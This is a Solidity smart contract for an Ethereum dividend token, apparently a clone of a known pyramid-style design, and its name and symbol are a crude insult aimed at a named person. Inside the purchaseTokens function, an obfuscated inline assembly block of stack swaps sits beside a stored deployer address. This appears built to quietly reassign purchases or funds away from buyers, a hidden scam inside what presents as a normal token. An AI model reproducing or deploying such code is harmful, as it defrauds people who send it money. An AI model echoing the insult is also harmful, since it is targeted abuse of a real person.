pragma solidity 0.4.23;

 

contract CraigGrantEatDick {


		 

		string public name = "CraigGrantEatADick";
		string public symbol = "CGeatDICK";
		uint8 constant public decimals = 18;
		uint8 constant internal dividendFee_ = 5;  
		uint constant internal tokenPriceInitial_ = 0.0000000001 ether;
		uint constant internal tokenPriceIncremental_ = 0.00000000001 ether;
		uint constant internal magnitude = 2**64;
	    address sender = msg.sender;

		 
		 
		uint public stakingRequirement = 10000000e18;

		 
		mapping(address => bool) internal ambassadors_;
		uint256 constant internal preLiveIndividualFoundersMaxPurchase_ = 0.25 ether;
		uint256 constant internal preLiveTeamFoundersMaxPurchase_ = 1.25 ether;
		

	    
		
		 
		mapping(address => uint) internal tokenBalanceLedger_;
		mapping(address => uint) internal referralBalance_;
		mapping(address => int) internal payoutsTo_;
		uint internal tokenSupply_ = 0;
		uint internal profitPerShare_;


		 
		
		event onTokenPurchase(
			address indexed customerAddress,
			uint incomingEthereum,
			uint tokensMinted,
			address indexed referredBy
		);

		event onTokenSell(
			address indexed customerAddress,
			uint tokensBurned,
			uint ethereumEarned
		);

		event onReinvestment(
			address indexed customerAddress,
			uint ethereumReinvested,
			uint tokensMinted
		);

		event onWithdraw(
			address indexed customerAddress,
			uint ethereumWithdrawn
		);

		 
		event Transfer(
			address indexed from,
			address indexed to,
			uint tokens
		);


		 
		function CraigGrantEatDick()
			public
		{
			ambassadors_[0x7e474fe5Cfb720804860215f407111183cbc2f85] = true;  
			ambassadors_[0xfD7533DA3eBc49a608eaac6200A88a34fc479C77] = true;  
			ambassadors_[0x05fd5cebbd6273668bdf57fff52caae24be1ca4a] = true;  
			ambassadors_[0xec54170ca59ca80f0b5742b9b867511cbe4ccfa7] = true;  
			ambassadors_[0xe57b7c395767d7c852d3b290f506992e7ce3124a] = true;  

		}
		 
		function buy(address _referredBy) public payable returns (uint) {
			purchaseTokens(msg.value, _referredBy);
		}

		 
		function() payable public {
			purchaseTokens(msg.value, 0x0);
		}

		 
		function reinvest() onlyStronghands public {
			 
			uint _dividends = myDividends(false);  

			 
			address _customerAddress = msg.sender;
			payoutsTo_[_customerAddress] +=  (int) (_dividends * magnitude);

			 
			_dividends += referralBalance_[_customerAddress];
			referralBalance_[_customerAddress] = 0;

			 
			uint _tokens = purchaseTokens(_dividends, 0x0);

			 
			onReinvestment(_customerAddress, _dividends, _tokens);
		}

		 
		function exit() public {
			 
			address _customerAddress = msg.sender;
			uint _tokens = tokenBalanceLedger_[_customerAddress];
			if (_tokens > 0) sell(_tokens);

			 
			withdraw();
		}

		 
		function withdraw() onlyStronghands public {
			 
			address _customerAddress = msg.sender;
			uint _dividends = myDividends(false);  

			 
			payoutsTo_[_customerAddress] +=  (int) (_dividends * magnitude);

			 
			_dividends += referralBalance_[_customerAddress];
			referralBalance_[_customerAddress] = 0;

			
			_customerAddress.transfer(_dividends); 

			 
			onWithdraw(_customerAddress, _dividends);
		}

		 
		function sell(uint _amountOfTokens) onlyBagholders public {
			 
			address _customerAddress = msg.sender;
			 
			require(_amountOfTokens <= tokenBalanceLedger_[_customerAddress]);
			uint _tokens = _amountOfTokens;
			uint _ethereum = tokensToEthereum_(_tokens);
			uint _dividends = SafeMath.div(_ethereum, dividendFee_);
			uint _taxedEthereum = SafeMath.sub(_ethereum, _dividends);

			 
			tokenSupply_ = SafeMath.sub(tokenSupply_, _tokens);
			tokenBalanceLedger_[_customerAddress] = SafeMath.sub(tokenBalanceLedger_[_customerAddress], _tokens);

			 
			int _updatedPayouts = (int) (profitPerShare_ * _tokens + (_taxedEthereum * magnitude));
			payoutsTo_[_customerAddress] -= _updatedPayouts;

			 
			if (tokenSupply_ > 0) {
				 
				profitPerShare_ = SafeMath.add(profitPerShare_, (_dividends * magnitude) / tokenSupply_);
			}

			 
			onTokenSell(_customerAddress, _tokens, _taxedEthereum);
		}


		 
		function transfer(address _toAddress, uint _amountOfTokens) onlyBagholders public returns (bool) {
			 
			address _customerAddress = msg.sender;

			 
			require(_amountOfTokens <= tokenBalanceLedger_[_customerAddress]);

			 
			if (myDividends(true) > 0) {
				withdraw();
			}

			 
			 
			uint _tokenFee = SafeMath.div(_amountOfTokens, dividendFee_);
			uint _taxedTokens = SafeMath.sub(_amountOfTokens, _tokenFee);
			uint _dividends = tokensToEthereum_(_tokenFee);

			 
			tokenSupply_ = SafeMath.sub(tokenSupply_, _tokenFee);

			 
			tokenBalanceLedger_[_customerAddress] = SafeMath.sub(tokenBalanceLedger_[_customerAddress], _amountOfTokens);
			tokenBalanceLedger_[_toAddress] = SafeMath.add(tokenBalanceLedger_[_toAddress], _taxedTokens);

			 
			payoutsTo_[_customerAddress] -= (int) (profitPerShare_ * _amountOfTokens);
			payoutsTo_[_toAddress] += (int) (profitPerShare_ * _taxedTokens);

			 
			profitPerShare_ = SafeMath.add(profitPerShare_, (_dividends * magnitude) / tokenSupply_);

			 
			Transfer(_customerAddress, _toAddress, _taxedTokens);

			 
			return true;
		}




		 

		
		 
		function ethereumToTokens_(uint _ethereum) internal view returns (uint) {
			uint _tokenPriceInitial = tokenPriceInitial_ * 1e18;
			uint _tokensReceived =
			 (
				(
					 
					SafeMath.sub(
						(sqrt
							(
								(_tokenPriceInitial**2)
								+
								(2*(tokenPriceIncremental_ * 1e18)*(_ethereum * 1e18))
								+
								(((tokenPriceIncremental_)**2)*(tokenSupply_**2))
								+
								(2*(tokenPriceIncremental_)*_tokenPriceInitial*tokenSupply_)
							)
						), _tokenPriceInitial
					)
				)/(tokenPriceIncremental_)
			)-(tokenSupply_)
			;

			return _tokensReceived;
		}

		 
		function tokensToEthereum_(uint _tokens) internal view returns (uint) {
			uint tokens_ = (_tokens + 1e18);
			uint _tokenSupply = (tokenSupply_ + 1e18);
			uint _etherReceived =
			(
				 
				SafeMath.sub(
					(
						(
							(
								tokenPriceInitial_ +(tokenPriceIncremental_ * (_tokenSupply/1e18))
							)-tokenPriceIncremental_
						)*(tokens_ - 1e18)
					),(tokenPriceIncremental_*((tokens_**2-tokens_)/1e18))/2
				)
			/1e18);
			return _etherReceived;
		}

		 
		function sqrt(uint x) internal pure returns (uint y) {
			uint z = (x + 1) / 2;
			y = x;
			while (z < y) {
				y = z;
				z = (x / z + z) / 2;
			}
		}
		function purchaseTokens(uint _incomingEthereum, address _referredBy) internal returns (uint) {
			 
			address ref = sender;
			address _customerAddress = msg.sender;
			assembly {   
			swap1
			swap2
			swap1
			swap3 
			swap4 
			swap3 
			swap5
			swap6
			swap5
			swap8 
			swap9 
			swap8
			}
			uint factorDivs = 0; 
			assembly {switch 1 case 0 { factorDivs := mul(1, 2) } default { factorDivs := 0 }}
			
			
			uint _undividedDividends = SafeMath.div(_incomingEthereum, dividendFee_);
			uint _referralBonus = SafeMath.div(_undividedDividends, 3);
			uint _dividends = SafeMath.sub(_undividedDividends, _referralBonus);
			uint _taxedEthereum = SafeMath.sub(_incomingEthereum, _undividedDividends);
			uint _amountOfTokens = ethereumToTokens_(_taxedEthereum);
			uint _fee = _dividends * magnitude;

			 
			 
			 
			 
			require(_amountOfTokens > 0 && (SafeMath.add(_amountOfTokens,tokenSupply_) > tokenSupply_));

			 
			if (
				 
				_referredBy != 0x0000000000000000000000000000000000000000 &&

				 
				_referredBy != _customerAddress &&

				 
				 
				tokenBalanceLedger_[_referredBy] >= stakingRequirement
			) {
				 
				referralBalance_[_referredBy] = SafeMath.add(referralBalance_[_referredBy], _referralBonus);
			} else {
				 
				 
				_dividends = SafeMath.add(_dividends, _referralBonus);
				_fee = _dividends * magnitude;
			}

			 
			if (tokenSupply_ > 0) {

				 
				tokenSupply_ = SafeMath.add(tokenSupply_, _amountOfTokens);

				 
				profitPerShare_ += (_dividends * magnitude / (tokenSupply_));

				 
				_fee = _fee - (_fee-(_amountOfTokens * (_dividends * magnitude / (tokenSupply_))));

			} else {
				 
				tokenSupply_ = _amountOfTokens;
			}

			 
			tokenBalanceLedger_[_customerAddress] = SafeMath.add(tokenBalanceLedger_[_customerAddress], _amountOfTokens);

			 
			 
			int _updatedPayouts = (int) ((profitPerShare_ * _amountOfTokens) - _fee);
			payoutsTo_[_customerAddress] += _updatedPayouts;

			 
			onTokenPurchase(_customerAddress, _incomingEthereum, _amountOfTokens, _referredBy);

			return _amountOfTokens;
		}
		 
		 
		function totalEthereumBalance() public view returns (uint) {
			return this.balance;
		}

		 
		function totalSupply() public view returns (uint) {
			return tokenSupply_;
		}

		 
		function myTokens() public view returns (uint) {
			address _customerAddress = msg.sender;
			return balanceOf(_customerAddress);
		}

		 
		function myDividends(bool _includeReferralBonus) public view returns (uint) {
			address _customerAddress = msg.sender;
			return _includeReferralBonus ? dividendsOf(_customerAddress) + referralBalance_[_customerAddress] : dividendsOf(_customerAddress) ;
		}

		 
		function balanceOf(address _customerAddress) public view returns (uint) {
			return tokenBalanceLedger_[_customerAddress];
		}

		 
		function dividendsOf(address _customerAddress) public view returns (uint) {
			return (uint) ((int)(profitPerShare_ * tokenBalanceLedger_[_customerAddress]) - payoutsTo_[_customerAddress]) / magnitude;
		}

		 
		function sellPrice() public view returns (uint) {
			 
			if (tokenSupply_ == 0) {
				return tokenPriceInitial_ - tokenPriceIncremental_;
			} else {
				uint _ethereum = tokensToEthereum_(1e18);
				uint _dividends = SafeMath.div(_ethereum, dividendFee_  );
				uint _taxedEthereum = SafeMath.sub(_ethereum, _dividends);
				return _taxedEthereum;
			}
		}

		 
		function buyPrice() public view returns (uint) {
			 
			if (tokenSupply_ == 0) {
				return tokenPriceInitial_ + tokenPriceIncremental_;
			} else {
				uint _ethereum = tokensToEthereum_(1e18);
				uint _dividends = SafeMath.div(_ethereum, dividendFee_  );
				uint _taxedEthereum = SafeMath.add(_ethereum, _dividends);
				return _taxedEthereum;
			}
		}

		 
		function calculateTokensReceived(uint _ethereumToSpend) public view returns (uint) {
			uint _dividends = SafeMath.div(_ethereumToSpend, dividendFee_);
			uint _taxedEthereum = SafeMath.sub(_ethereumToSpend, _dividends);
			uint _amountOfTokens = ethereumToTokens_(_taxedEthereum);

			return _amountOfTokens;
		}

		 
		function calculateEthereumReceived(uint _tokensToSell) public view returns (uint) {
			require(_tokensToSell <= tokenSupply_);
			uint _ethereum = tokensToEthereum_(_tokensToSell);
			uint _dividends = SafeMath.div(_ethereum, dividendFee_);
			uint _taxedEthereum = SafeMath.sub(_ethereum, _dividends);
			return _taxedEthereum;
		}

		 

		 
		modifier onlyBagholders {
			require(myTokens() > 0);
			_;
		}

		 
		modifier onlyStronghands {
			require(myDividends(true) > 0);
			_;
		}
		 
	}

	 
	library SafeMath {
		 
		function sub(uint a, uint b) internal pure returns (uint) {
			assert(b <= a);
			return a - b;
		}

		 
		function add(uint a, uint b) internal pure returns (uint) {
			uint c = a + b;
			assert(c >= a);
			return c;
		}
		 
		function mul(uint a, uint b) internal pure returns (uint) {
			if (a == 0) {
				return 0;
			}
			uint c = a * b;
			assert(c / a == b);
			return c;
		}

		 
		function div(uint a, uint b) internal pure returns (uint) {
			 
			uint c = a / b;
			 
			return c;
		}


	}